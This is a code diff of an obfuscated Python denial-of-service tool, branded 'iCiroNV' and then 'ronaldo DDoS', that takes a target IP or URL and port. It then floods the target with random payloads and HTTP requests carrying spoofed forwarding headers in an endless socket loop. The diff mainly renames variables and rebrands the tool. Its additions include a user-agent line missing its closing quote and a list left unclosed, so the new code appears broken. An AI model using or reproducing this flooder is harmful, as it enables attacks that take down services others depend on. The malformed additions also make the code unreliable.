@@ -14,19 +14,19 @@ import threading
 import time
 import os
 os.system('color ' +random.choice(['a'])+ " & cls & title iCiroNV DDoS V4")
-YkvBlzIbNhCTSYQeOvhqzcMlZVVANmzH = input("\033[1;36;40mâ•­â”€Name \nâ””â”€â”€â”€â”€")
-print("[//>]Searching " + YkvBlzIbNhCTSYQeOvhqzcMlZVVANmzH + " in database...!")
+BYiEZPXMPHcCesvfAvNvDUJibQvBkxVO = input("\033[1;36;40mâ•­â”€Name \nâ””â”€â”€â”€â”€")
+print("[//>]Searching " + BYiEZPXMPHcCesvfAvNvDUJibQvBkxVO + " in database...!")
 time.sleep(1.5)
 print("[//>]Success!\n\n")
-CVcBlYgurHYzwrJfxedEYKUIhDwVQhHy = input("â•­â”€Password \nâ””â”€â”€â”€â”€")
-if CVcBlYgurHYzwrJfxedEYKUIhDwVQhHy == "1" :
+VbWuCJkfSKfDXzuStnFwbBykfnQfuEio = input("â•­â”€Password \nâ””â”€â”€â”€â”€")
+if VbWuCJkfSKfDXzuStnFwbBykfnQfuEio == "1" :
        print("[âœ“] Correct password.")
        time.sleep(1)
 else :
 	   print("\033[1;31;40m[x] Wrong password\033[0;37;40m")
 	   time.sleep(2)
 	   time.sleep(10000000000000000)
-xWcVUIdYifEZMVOPBoOidZCdHKumwhwq = [
+nGzycplMbjGFdDiJMAwZORlEQnqzHFps = [
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
      'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
      'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
@@ -70,6 +70,7 @@ xWcVUIdYifEZMVOPBoOidZCdHKumwhwq = [
      'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
      'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
      'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
+     'Mozilla/5.0 (X11; Linux x86_64; rv:12.0a3) Gecko/20181200 Firefox/12.12 Iceweasel/12.12,
      'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
      'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
      'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
@@ -134,7 +135,7 @@ xWcVUIdYifEZMVOPBoOidZCdHKumwhwq = [
      'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
      'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']
-TpoOIwINSvchkWHnrHEpYEteKUcvofnI = [
+zwuMVuFpKrJCHzaDcarcZRgxnuDfivWO = [
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
      'Accept-Encoding: gzip, deflate\r\n',
      'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
@@ -149,7 +150,7 @@ TpoOIwINSvchkWHnrHEpYEteKUcvofnI = [
      'Accept-Language: en-US,en;q=0.5\r\n',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
      'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n']
-GuarLUaIqbKPDGdSSYZYycdnbfcHHBhq = [
+WDMkfWVyZhORDXXwAgGAvpuxTTRsUgdz = [
      'This-server-get-attacked-by-ronaldo',
      'This-server-get-attacked-by-ronaldo',
      'This-server-get-attacked-by-ronaldo',
@@ -164,14 +165,18 @@ GuarLUaIqbKPDGdSSYZYycdnbfcHHBhq = [
      'This-server-get-attacked-by-ronaldo',
      'This-server-get-attacked-by-ronaldo',
      'This-server-get-attacked-by-ronaldo',
-     'This-server-get-attacked-by-ronaldo']
+     'This-server-get-attacked-by-ronaldo',
+     'This-server-get-attacked-by-ronaldo',
+     'This-server-get-attacked-by-ronaldo',
+     'This-server-get-attacked-by-ronaldo',
+     'This-server-get-attacked-by-ronaldo',
 if sys.platform.startswith("linux"):
    os.system('clear')
 elif sys.platform.startswith("freebsd"):
    os.system('clear')
 else:
-   os.system('color ' +random.choice(['5'])+ " & cls & title iCiroNV DDoS V4 used by " + YkvBlzIbNhCTSYQeOvhqzcMlZVVANmzH + "")
-LdBsrBwtNtcjufTJAMaQAQUhSBvnIaWh = """
+   os.system('color ' +random.choice(['5'])+ " & cls & title ronaldo DDoS V4 used by " + BYiEZPXMPHcCesvfAvNvDUJibQvBkxVO + "")
+PfMpeXCzrYSSXoWjmDgOazljfWimdoVc = """
 \033[1;31;40m â–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•گâ•گâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•گâ•گâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•گâ•گâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â•ڑâ•گâ•‌â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•‌â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•ڑâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•‌
@@ -183,91 +188,149 @@ LdBsrBwtNtcjufTJAMaQAQUhSBvnIaWh = """
 â•‘   Version : 1.1                â•‘
 â•‘   Dont leak!                     â•‘
 â•ڑâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•گâ•‌\n"""
-print(LdBsrBwtNtcjufTJAMaQAQUhSBvnIaWh)
-RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE = str(input("\033[1;37;40m [//>] \033[0105m Target IP / URL : "))
-LrsjmaLhUqnYbqeKXwlKrcHdNECHIKGZ = int(input("\033[1;37;40m [//>] Target Port [80] : "))
-yzDNuUVElSwAFgmjWGZwFVocrsIgUkmu = str(input("\033[1;37;40m[iCiro] Methode 1 untuk target website. \n[iCiro] Methode 2 Untuk target IP. \n\033[1;37;40m [//>] Pilih Methode [1/2]: "))
-GjEfFIuslANMoMZeUmvztYXZWCUHEAwJ = '182.21.20.32'
-def AzyxqmmYKTGKAxiyBhRWHLrqJYIxpgth():
-    HuLMNmQsBknBxGkIvmDcAJdvblFJrihs = [192, 168, 0, 1]
-    dAwMSDYeHLZBpMyinGFBkveEFMmwJiGe = '.'
-    HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[0] = str(random.randrange(11, 197))
-    HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[1] = str(random.randrange(0, 255))
-    HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[2] = str(random.randrange(0, 255))
-    HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[3] = str(random.randrange(2, 254))
-    gVWuNLLEISmBWZibFwEhlwoPtvQVnCSn = HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[0] + dAwMSDYeHLZBpMyinGFBkveEFMmwJiGe + HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[1] + dAwMSDYeHLZBpMyinGFBkveEFMmwJiGe + HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[2] + dAwMSDYeHLZBpMyinGFBkveEFMmwJiGe + HuLMNmQsBknBxGkIvmDcAJdvblFJrihs[3]
-    return gVWuNLLEISmBWZibFwEhlwoPtvQVnCSn
-def xXUapXtByAVCEjAjvqxYqDYvruDbMOxb(method):
-    PWIskgOdfBaSZAAPnmSQFURngzgTsNnS = ""
+print(PfMpeXCzrYSSXoWjmDgOazljfWimdoVc)
+RTYRMNjzgsCWSFFNatozGFZKdYGQmYef = str(input("\033[1;37;40m [//>] \033[0105m Target IP / URL : "))
+CjiGezquJYCevYgtLijBYyKUEWrPKcsP = int(input("\033[1;37;40m [//>] Target Port [80] : "))
+YhATORhvGVlQqiCIjpxmiYkkWqxZyRxo = str(input("\033[1;37;40m[iCiro] Methode 1 untuk target website. \n[iCiro] Methode 2 Untuk target IP. \n\033[1;37;40m [//>] Pilih Methode [1/2]: "))
+lWcdfdUXHLTTeQFYaYzkspfrIFvqAsMy = '182.21.20.32'
+def SzruUUnRsOBRTDlqoytjMeCYGNKHVbLa():
+    TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi = [192, 168, 0, 1]
+    ipVPOSWDCGYDYjcexZoGuGslathKkWkG = '.'
+    TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[0] = str(random.randrange(11, 197))
+    TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[1] = str(random.randrange(0, 255))
+    TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[2] = str(random.randrange(0, 255))
+    TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[3] = str(random.randrange(2, 254))
+    stuPPjZZxMjcrZkCnXubgGvwGMxqSORt = TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[0] + ipVPOSWDCGYDYjcexZoGuGslathKkWkG + TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[1] + ipVPOSWDCGYDYjcexZoGuGslathKkWkG + TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[2] + ipVPOSWDCGYDYjcexZoGuGslathKkWkG + TKKJxMoyNxPualzKhyMAXeqQwNbuwkCi[3]
+    return stuPPjZZxMjcrZkCnXubgGvwGMxqSORt
+def kmdyVXtnfKYMuWzRqbRPMnsBWbsfkGEP(method):
+    kgNVJxvumqXJMhozqMeemOePFClEvGrN = ""
     if method == "get" or method == "head":
-        ZelEnTSFwzyvZxwNKcsCHyIJcQGrbwjp = "POST /Attacked-by-iCiroNV HTTP/1.1\r\nHost: " + RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE + "\r\n"
-        yuGwIpdSAhikZXusOsLyWfwfzYTOKAgL = "Connection: Keep-Alive\r\n"
-        aYdxRIqGIOVgUJmtTUVNDUwJsTOEtrlz = random.choice(TpoOIwINSvchkWHnrHEpYEteKUcvofnI) + "\r\n"
-        CvzmhphPtnHRiiWIiwItYXVgnnsruTjO = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        YTMYidBXYyCofBMPfzBQSOXnrcBtspLv = "Referer: " + random.choice(GuarLUaIqbKPDGdSSYZYycdnbfcHHBhq) + RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE + "\r\n"
-        yuGwIpdSAhikZXusOsLyWfwfzYTOKAgL += "Cache-Control: max-age=0\r\n"
-        yuGwIpdSAhikZXusOsLyWfwfzYTOKAgL += "pragma: no-cache\r\n"
-        yuGwIpdSAhikZXusOsLyWfwfzYTOKAgL += "X-Forwarded-For: " + AzyxqmmYKTGKAxiyBhRWHLrqJYIxpgth() + "\r\n"
-        bNbEzZRjjCGNowSaOJzxSJSdjQpPSRbH  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
-        UBDVkeFyzXgfyUKDLyxZyMKazmSKYedG = "X-Forwarded-For: 1\r\n"
-        UBDVkeFyzXgfyUKDLyxZyMKazmSKYedG += "Client-IP: 10000\r\n"
-        EZAbhswjxMeOxtEwhSESOwztlUZczPEM = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-        pbyBArsmZBmTEclNdWBaalliFaqVDLVn = "User-Agent: " + random.choice(xWcVUIdYifEZMVOPBoOidZCdHKumwhwq) + "\r\n"
-        PWIskgOdfBaSZAAPnmSQFURngzgTsNnS = ZelEnTSFwzyvZxwNKcsCHyIJcQGrbwjp + YTMYidBXYyCofBMPfzBQSOXnrcBtspLv + UBDVkeFyzXgfyUKDLyxZyMKazmSKYedG + pbyBArsmZBmTEclNdWBaalliFaqVDLVn + aYdxRIqGIOVgUJmtTUVNDUwJsTOEtrlz + CvzmhphPtnHRiiWIiwItYXVgnnsruTjO + yuGwIpdSAhikZXusOsLyWfwfzYTOKAgL +  EZAbhswjxMeOxtEwhSESOwztlUZczPEM + "\r\n\r\n"
-    return PWIskgOdfBaSZAAPnmSQFURngzgTsNnS
+        eGZCsmZemdCEHFlDWOaNbrXyrarwkOVI = "POST /Attacked-by-ronaldo HTTP/1.1\r\nHost: " + RTYRMNjzgsCWSFFNatozGFZKdYGQmYef + "\r\n"
+        zCUmbJSxqtxZzqQXbXvJvbIijMcBAVpJ = "Connection: Keep-Alive\r\n"
+        yOrWOLauvkyaeWTnmHpQgkreLrdmfDiV = random.choice(zwuMVuFpKrJCHzaDcarcZRgxnuDfivWO) + "\r\n"
+        cnrJValpunAkKrbUtKTehkmohCIOEnIm = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        jOdPEXSRABrpIAotUZAVSrAohznUtZDj = "Referer: " + random.choice(WDMkfWVyZhORDXXwAgGAvpuxTTRsUgdz) + RTYRMNjzgsCWSFFNatozGFZKdYGQmYef + "\r\n"
+        zCUmbJSxqtxZzqQXbXvJvbIijMcBAVpJ += "Cache-Control: max-age=0\r\n"
+        zCUmbJSxqtxZzqQXbXvJvbIijMcBAVpJ += "pragma: no-cache\r\n"
+        zCUmbJSxqtxZzqQXbXvJvbIijMcBAVpJ += "X-Forwarded-For: " + SzruUUnRsOBRTDlqoytjMeCYGNKHVbLa() + "\r\n"
+        oMKpYfsrFFdkcHRPvrNzCKbRFwDaikEF  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
+        KZYQScVVSSzqkmpEpmHmEPwdgjzbVDbx = "X-Forwarded-For: 1\r\n"
+        KZYQScVVSSzqkmpEpmHmEPwdgjzbVDbx += "Client-IP: 10000\r\n"
+        UzrNyCCrzIwvkayKqclxPsDzzjVIrWdd = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+        mknMCwKOfYtYYkuZtHBCrkiTweGrPAxb = "User-Agent: " + random.choice(nGzycplMbjGFdDiJMAwZORlEQnqzHFps) + "\r\n"
+        kgNVJxvumqXJMhozqMeemOePFClEvGrN = eGZCsmZemdCEHFlDWOaNbrXyrarwkOVI + jOdPEXSRABrpIAotUZAVSrAohznUtZDj + KZYQScVVSSzqkmpEpmHmEPwdgjzbVDbx + mknMCwKOfYtYYkuZtHBCrkiTweGrPAxb + yOrWOLauvkyaeWTnmHpQgkreLrdmfDiV + cnrJValpunAkKrbUtKTehkmohCIOEnIm + zCUmbJSxqtxZzqQXbXvJvbIijMcBAVpJ +  UzrNyCCrzIwvkayKqclxPsDzzjVIrWdd + "\r\n\r\n"
+    return kgNVJxvumqXJMhozqMeemOePFClEvGrN
 os.system('color ' +random.choice(['5'])+ " & cls & title ronaldo DDoS Tools V1")
-def pwmxSFYpIVnFDmrXHkTQPryfSyXeQRvN():
-    PWIskgOdfBaSZAAPnmSQFURngzgTsNnS = xXUapXtByAVCEjAjvqxYqDYvruDbMOxb("get")
-    wbpUMRwKaXEkdCdOrSiuSPKtdCkGCYcw = random.choice(("[*]","[!]","[#]"))
-    nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB = random._urandom(20179)
-    if yzDNuUVElSwAFgmjWGZwFVocrsIgUkmu == "1":
-        nUddMeqaLpDUCfgREQhbTcLAuRBZYzYT = "GET /Attacked-by-ronaldo HTTP/1.1\r\nHost: " + RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE + "\r\n"
-        tpkfDnICpgrkFmtblMgKCNACtcaaPnWS  = nUddMeqaLpDUCfgREQhbTcLAuRBZYzYT + PWIskgOdfBaSZAAPnmSQFURngzgTsNnS + "\r\n"
+def dEAWbFSOptmUvYBenGclVsthHzwfHLaq():
+    kgNVJxvumqXJMhozqMeemOePFClEvGrN = kmdyVXtnfKYMuWzRqbRPMnsBWbsfkGEP("get")
+    wILVzXKJHUygYfakTGjfAkelojOOFvZv = random.choice(("[*]","[!]","[#]"))
+    EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX = random._urandom(20179)
+    if YhATORhvGVlQqiCIjpxmiYkkWqxZyRxo == "1":
+        bDGDdgbdZyRvurgDzdbJjlPgiggfQgYn = "GET /Attacked-by-ronaldo HTTP/1.1\r\nHost: " + RTYRMNjzgsCWSFFNatozGFZKdYGQmYef + "\r\n"
+        tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ  = bDGDdgbdZyRvurgDzdbJjlPgiggfQgYn + kgNVJxvumqXJMhozqMeemOePFClEvGrN + "\r\n"
     else:
-        nUddMeqaLpDUCfgREQhbTcLAuRBZYzYT = random.choice(['GET','POST','HEAD']) + " /Attacked-by-ronaldo HTTP/1.1\r\nHost: " + RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE + "\r\n"
-        tpkfDnICpgrkFmtblMgKCNACtcaaPnWS  = nUddMeqaLpDUCfgREQhbTcLAuRBZYzYT + PWIskgOdfBaSZAAPnmSQFURngzgTsNnS + "\r\n"
+        bDGDdgbdZyRvurgDzdbJjlPgiggfQgYn = random.choice(['GET','POST','HEAD']) + " /Attacked-by-ronaldo HTTP/1.1\r\nHost: " + RTYRMNjzgsCWSFFNatozGFZKdYGQmYef + "\r\n"
+        tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ  = bDGDdgbdZyRvurgDzdbJjlPgiggfQgYn + kgNVJxvumqXJMhozqMeemOePFClEvGrN + "\r\n"
     while True:
         try:
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.connect((RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE,LrsjmaLhUqnYbqeKXwlKrcHdNECHIKGZ))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            for sBIWEvVDXbEgvvAklckStlqZUBVZlXhU in range(60000):
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.send(nyWwEfbTHlMLZIOKjTSJOnMaIdXTxMLB)
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-                WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.sendall(str.encode(tpkfDnICpgrkFmtblMgKCNACtcaaPnWS))
-            print(wbpUMRwKaXEkdCdOrSiuSPKtdCkGCYcw +" \033[5;37;40mAttacking...")
+            CihunXkTXricEtulpGsebiyexJWwnGCM = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.connect((RTYRMNjzgsCWSFFNatozGFZKdYGQmYef,CjiGezquJYCevYgtLijBYyKUEWrPKcsP))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
